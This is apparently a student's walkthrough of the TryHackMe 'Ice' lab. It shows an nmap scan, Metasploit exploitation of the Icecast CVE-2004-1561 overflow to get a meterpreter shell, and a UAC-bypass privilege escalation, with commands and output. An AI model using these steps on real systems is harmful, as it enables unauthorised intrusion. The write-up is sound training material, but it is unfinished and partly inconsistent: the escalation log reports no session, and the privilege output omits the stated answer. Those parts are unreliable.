# ICE

Deploy & hack into a Windows machine, exploiting a very poorly secured media server.

[Ice](https://tryhackme.com/room/ice)

## Topic's

* Network Enumeration
* CVE-2004-1561 - Icecast 2.0.1
* Metasploit (local_exploit_suggester)
* Metasploit (bypassuac_eventvwr)

## [Task 1] Connect

Connect to the TryHackMe network! Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

The virtual machine used in this room (Ice) can be downloaded for offline usage from [https://darkstar7471.com/resources.html](https://darkstar7471.com/resources.html). The sequel to this room, Blaster, can be found [here](https://tryhackme.com/room/blaster).

1. Connect to our network using OpenVPN. Here is a mini walkthrough of connecting: Go to your [access](http://tryhackme.com/access) page and download your configuration file.

![download vpn](https://i.gyazo.com/c86eba5538466dc1d948e09b6f14b53b.png)

`No answer needed`

2. Use an OpenVPN client to connect. In my example I am on Linux, on the access page we have a windows tutorial.

![vpn](https://i.gyazo.com/42083cc1831acad79e5a6fa2b235792f.png) (change "ben.ovpn" to your config file)

When you run this you see lots of text, at the end it will say Initialization Sequence Completed

`No answer needed`

3. You can verify you are connected by looking on your access page. Refresh the page

You should see a green tick next to Connected. It will also show you your internal IP address.

![Network Information](https://i.gyazo.com/fad648871fd0e51d1d5590d005329f1c.png)

You are now ready to use our machines on our network!

`No answer needed`

4. Now when you deploy material, you will see an internal IP address of your Virtual Machine.

`No answer needed`

## [Task 2] Recon

![Nmap](https://i.imgur.com/7tFp450.png)

Scan and enumerate our victim!

1. Deploy the machine! This may take up to three minutes to start.

`No answer needed`

2. Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room '[RP: Nmap](https://tryhackme.com/room/rpnmap)' prior to this room. 

```
sudo nmap -sS -sC -sV -p- ice
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 14:30 EDT
Nmap scan report for ice (10.10.202.247)
Host is up (0.039s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:55:02:d5:d0:a9 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-09-14T13:36:35-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-14T18:36:35
|_  start_date: 2020-09-14T18:19:23

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 400.13 seconds

```

`No answer needed`

3. Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

`3389`

4. What service did nmap identify as running on port 8000? (First word of this service)

`Icecast`

5. What does Nmap identify as the hostname of the machine? (All caps for the answer)

## [Task 3] Gain Access

![Icecast](https://i.imgur.com/FFqM2ZK.png)

Exploit the target vulnerable service to gain a foothold!

1. Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.

`execute code overflow`

2. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

`CVE-2004-1561`

3. Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`

`No answer needed`

4. After Metasploit has started, let's search for our target exploit using the command '`search icecast`'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary.

`exploit/windows/http/icecast_header`

5. Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.

`No answer needed`

6. Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?

`RHOSTS`

7. First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`

`No answer needed`

## [Task 4] Escalate

1. Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

`meterpreter`

2. What user was running that Icecast process? The commands used in this question and the next few are taken directly from the '[RP: Metasploit](https://tryhackme.com/room/rpmetasploit)' room.


```
meterpreter > getuid
```

```
Server username: Dark-PC\Dark
```

`Dark`

3. What build of Windows is the system?

```
meterpreter > sysinfo
```

```
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

`7601`

4. Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?

`x64`

5. Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*

```
meterpreter > run post/multi/recon/local_exploit_suggester
```

```
[*] 10.10.202.247 - Collecting local exploits for x86/windows...
[*] 10.10.202.247 - 30 exploit checks are being tried...
[+] 10.10.202.247 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.202.247 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.202.247 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.202.247 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.202.247 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.202.247 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.202.247 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.202.247 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

`No answer needed`

6. Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?

`exploit/windows/local/bypassuac_eventvwr`

7. Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.

`No answer needed`

8. Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`

```
use exploit/windows/local/bypassuac_eventvwr
```

`No answer needed`

9. Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`

`No answer needed`

10. Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?

`LHOST`

11. Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`

`No answer needed`

12. After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails.

```
msf5 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 192.168.178.52:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Cleaning up registry keys ...
[*] Exploit completed, but no session was created.
```

`No answer needed`

13. Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`

```
msf5 exploit(windows/local/bypassuac_eventvwr) > sessions 1
[*] Starting interaction with 1...

meterpreter > 
```

`No answer needed`

14. We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

`No answer needed`

15. We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

`SeTakeOwnershipPrivilege`

## [Task 5] Looting

![](https://i.imgur.com/1kmEdf6.png)

Learn how to gather additional credentials and crack the saved hashes on the machine.

1. Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't).



## [Task 6] Post-Exploitation

## [Task 7] Extra Credit